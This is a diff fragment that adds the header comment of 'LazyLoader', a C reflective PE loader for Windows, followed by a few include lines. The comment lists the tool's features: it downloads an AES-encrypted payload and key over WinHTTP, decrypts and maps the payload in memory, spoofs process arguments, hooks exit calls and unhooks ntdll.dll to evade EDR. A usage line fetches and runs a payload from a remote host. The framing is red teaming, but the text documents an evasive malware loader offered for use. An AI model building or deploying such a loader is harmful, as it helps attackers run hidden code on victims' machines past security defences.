@@ -1,3 +1,37 @@
+/**
+ * @file LazyLoader/main.c
+ * @brief A stealthy Windows PE loader designed to fetch, decrypt, and execute payloads remotely while evading detection.
+ *
+ * LazyLoader is a reflective PE loader that downloads an AES-256 encrypted Portable Executable (PE) file and its corresponding
+ * decryption key from a remote HTTP server. It decrypts the payload in memory, maps it into the current process, repairs its
+ * Import Address Table (IAT), applies command-line masquerading to hide execution context, and executes it reflectively.
+ * Additionally, it supports unhooking ntdll.dll by restoring its .text section from a clean copy obtained via a suspended
+ * notepad.exe process — useful for evading user-mode API hooks placed by EDRs or debuggers.
+ *
+ * I only translate to C from C++ ( https://github.com/d1rkmtrr/FilelessPELoader/ ), because i like more C xd, and to learn, and this version compile in linux :D
+ * 
+ * Key Features:
+ * - Downloads encrypted PE and key via WinHTTP.
+ * - AES-256 decryption using Windows CryptoAPI.
+ * - Reflective PE loading with relocation and IAT reconstruction.
+ * - Command-line and argv/argc masquerading to spoof process arguments.
+ * - Hooks common exit and command-line retrieval functions to prevent premature termination and hide true cmdline.
+ * - Optional ntdll.dll unhooking to bypass userland hooks.
+ * - Executes payload in a separate thread while maintaining stealth.
+ *
+ * Usage:
+ *   LazyLoader.exe <Host> <Port> <EncryptedPEPath> <KeyPath>
+ *
+ * Example:
+ *   LazyLoader.exe 192.168.1.10 8080 payload.bin key.bin
+ *
+ * Note: Built for Windows x64. Requires internet access and appropriate privileges.
+ * Designed for red teaming and educational purposes only.
+ *
+ * @author grisun0
+ * @version release/v0.0.1
+ * @date 2025
+ */
 #define _CRT_RAND_S
 #include <windows.h>
 #include <stdio.h>
